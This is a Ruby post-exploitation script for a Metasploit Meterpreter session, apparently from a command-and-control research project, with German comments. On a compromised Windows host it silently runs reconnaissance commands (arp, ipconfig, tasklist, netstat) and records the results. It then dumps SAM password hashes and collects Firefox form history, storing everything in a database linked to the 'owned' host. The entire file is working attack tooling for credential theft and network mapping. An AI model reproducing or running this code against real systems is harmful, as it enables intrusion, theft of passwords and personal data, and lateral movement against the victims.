require 'pp'

#dmke:
# * Zeile 20 match auch auf 999.999.999.999
# * Zeile 22 würde auch "xj-z-?.-@3-..." matchen "\S = nicht Whitespace"

@mIp = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/
@mMac = /\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}/

@ownedHost

def write_db host
  if session.framework.db.active
    session.framework.db.report_host host
  end
end

# executes a dos command
def exec_dos_cmd cmd
  r, cmdout = '', ''
  r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
  while d = r.channel.read
    cmdout << d
  end
  r.channel.close
  r.close
  cmdout
end

#saves a host in db g relevant data from owned host (db-table = 'host')
def get_host_infos
  cmdout = exec_dos_cmd 'arp -a'
  hostIp = ((cmdout.grep /^\S+:\s#{@mIp}/)[0].scan @mIp)[0].strip  
  hostMac = exec_dos_cmd('ipconfig /all')[/#{@mMac}.*#{hostIp}/m][/#{@mMac}/].strip
  
  sysinfo = client.sys.config.sysinfo
  host = { :workspace => session.framework.db.workspace, 
           :host      => hostIp,
           :mac       => hostMac,
           :name      => sysinfo['Computer'],
           :arch      => sysinfo['Architecture'],
           :os_lang   => sysinfo['System Language'],
           :os_name   => sysinfo['OS'][/(\s+|\w|,)+/].strip,
           :os_flavor =>  sysinfo['OS'] =~ /.*\(.*\).*/ ? sysinfo['OS'][/\(.+\)/][/(\w|\s)+/] : "",
           :os_sp     => sysinfo['OS'] =~ /.*\(.*Service Pack.*\).*/ ? sysinfo['OS'][/\(.+\)/][/(\w|\s|,)+/].split(",")[1].strip : ""
         }
  @ownedHost = session.framework.db.get_host(host)  
  write_db host
end

# Method for detecting all connected hosts 
def get_connected_hosts
  cmdout = exec_dos_cmd 'arp -a'
  relLines = cmdout.grep /.*#{@mIp}.*#{@mMac}.*/
  relLines.each do |line|
    host = { :workspace     => session.framework.db.workspace, # TODO: do i need this 
             :host          => line[/#{@mIp}/],
             :mac           => line[/#{@mMac}/],
             :pivot_host_id => @ownedHost[:id] 
           }
    write_db host
  end
end

#parses dos-command 'ipconfig /all' and saves result in db-table 'HostInterface'
def get_interfaces clear = true
  if clear 
    HostInterface.delete_all
  end

  cmdout = exec_dos_cmd 'ipconfig /all'

  # Filters unimportant lines and orders them
  m1 = /^\S.*:/
  min = Integer(cmdout.index(m1))
  whole =  cmdout[min,cmdout.size-min]
    
  names  = whole.grep m1
  tmp = whole.split m1
  keysValues = tmp[1,tmp.size] # first element is useless
    
  if not names.size % keysValues.size == 0
    puts "Error in get_interfaces "
    return
  end
 
  i = 0
  names.each do |name|
    tmp = keysValues[i].split(/^\s+.+:/)
    values = tmp[1,tmp.size] #'first element = ""'
    values.each do |value| 
      if value =~ /.*\S+.*/ # to not strip whitespace because of strange result ('"')
        value.strip! 
      end
    end
    
    HostInterface.new({ :host_id=>@ownedHost[:id],
                        :name=>name.strip.gsub(":", ""),
                        :dns_suffix=>values[0],
                        :description=>values[1],                 
                        :mac=>values[2],
                        :DHCPActive=> values[3] =~ /Ja|Yes|yes|/ ? true : false,
                        :AutoconfigActive=>values[4] =~ /Ja|Yes|yes|/ ? true : false,
                        :address=> values.size >= 6 ? values[5] : "",
                        :subnetmask=> values.size >= 7 ? values[6]  : "",
                        :defGateway => values.size >= 8 ? values[7] : "",
                        :DHCPServer => values.size >= 9 ? values[8] : "",
                        :DNSServer => values.size >= 10 ? values[9] : ""}).save
    i += 1
  end
end

#proccesses result of 'tasklist /svc' and saves it in the db
def get_tasklist clear = true
  if clear                     
    HostTasklist.delete_all
    HostTaskService.delete_all
  end
  
  cmdout = exec_dos_cmd 'tasklist /svc'

  lines = cmdout.split("\n")
  i = 4
  actPid = -1
  while i < lines.size - 1
    i += 1
    lineArray = lines[i].split
    if lineArray[1].to_i != 0
      actPid = lineArray[1]
      HostTasklist.new(:host_id=>@ownedHost[:id],:name=>lineArray[0],:pid=>actPid).save
      y = 2
      while y < lineArray.size 
        service = ''
        if lineArray[y].start_with? "Nicht" #TODO...just works in the german-windows-versions
          break
        end
        HostTaskService.new(:host_id=>@ownedHost[:id],:pid=>actPid,:service=>lineArray[y].gsub(/,/,"")).save
        y += 1
      end
    else
      services = lines[i].split
      services.each do |service|
        HostTaskService.new(:host_id=>@ownedHost[:id],:pid=>actPid,:service=>service.gsub(/,/,"")).save
      end
    end
  end
end 

#proccesses result of 'netstat /nao' and saves it in the db
def get_active_connections clear = true
  #to not overcrowd the database
  if clear                     
    HostActiveConnection.delete_all
  end

  cmdout = exec_dos_cmd 'netstat /nao'
      
  lines = cmdout.split("\n")
  i = 4
  actPid = -1
  while i < lines.size
    lineArray = lines[i].split
    if lineArray.size != 5 and lineArray.size != 4
      puts "in get_active_connections something unexpected happened"
      return
    end
    if lineArray.size == 5
      status = ''
      if lineArray[3].start_with? "ABH"
        status = 'ABHÖREN'
      else
        status = lineArray[3]
      end
      HostActiveConnection.new(:host_id=>@ownedHost[:id],:protocol=>lineArray[0],
                               :local_address=>lineArray[1],:remote_address=>lineArray[2],
                               :status=>status,:pid=>lineArray[4]).save
    end
    if lineArray.size == 4
      HostActiveConnection.new(:host_id=>@ownedHost[:id],:protocol=>lineArray[0],
                               :local_address=>lineArray[1], :remote_address=>lineArray[2], 
                               :pid=>lineArray[3]).save
    end
    i += 1
  end
end

#Function for running the hashdump
def get_hashdump_information clear = true
  begin
    if clear
      HashDump.delete_all
    end
    @client.core.use("priv")
    hashes = @client.priv.sam_hashes
    hashes.each do |h|
      HashDump.new(:host_id=>@ownedHost[:id],:hash_key=>h.to_s()).save
    end
  rescue ::Exception => e
    puts("\tError dumping hashes: #{e.class} #{e}")
    puts("\tPayload may be running with insufficient privileges!")
  end
end

#todo "run enum_firefox"
def get_frfx_forms newRun = false, clear = true
  if newRun 
    @client.run_cmd("enum_firefox") #works only local
  end
  
  #config = "config/msf.yml"
  config =  "/home/nox/dev/fidius2/candc3/config/msf.yml"
  
  if !File.exists? config
    puts "No config file found."
    return
  end
  props =   YAML.load_file(config)
  frfxLogPath = "/home/" + props['def_user'] + "/.msf3/logs/scripts/enum_firefox/"
  
  if not File.directory? frfxLogPath
    puts "reconnaissance: get_frfx_forms: firefox-enum-dir doesn't exist."
    return
  end

  arr = Array.new
  Dir.foreach(frfxLogPath) { |x|
    arr << x
  }
  if arr.size == 0
    puts "save_frfx_forms abborted, coz no frfx-log-dir was found."
    return;
  end
  
  if clear
    FrfxForm.delete_all
  end
 
  frfxLogDir =  frfxLogPath + arr.sort.last 
  
  File.open(frfxLogDir + "/main_form_history.txt") do |file|
    file.each do |line|
      lineArray = line.split
      FrfxForm.new(:host_id=>@ownedHost[:id],:form_name=>lineArray[1],:value=>lineArray[3]).save # insert into ...
    end
  end
  #if clear 
    #system 'rm -r ' + frfxLogDir
  #end
end  

# Has to be the first Function cause @ownedHost is set
get_host_infos

get_connected_hosts

get_interfaces

get_tasklist

get_active_connections

get_hashdump_information

get_frfx_forms 
